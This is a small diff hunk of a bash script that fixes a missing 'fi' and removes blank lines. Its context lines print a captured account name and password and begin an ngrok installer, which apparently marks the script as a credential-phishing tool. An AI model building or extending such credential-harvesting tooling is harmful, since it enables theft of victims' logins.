@@ -242,11 +242,10 @@ password=$(grep -o 'Pass:.*')
 echo -e $ red "Account : $account"
 echo -e $ red "Password: $password"
 echo -e $ red "Press Ctrl + C to Exit"
-
+fi
 }
 
 install_ngrok() {
-
 
 if [[ -e ngrok ]]; then
 echo ""
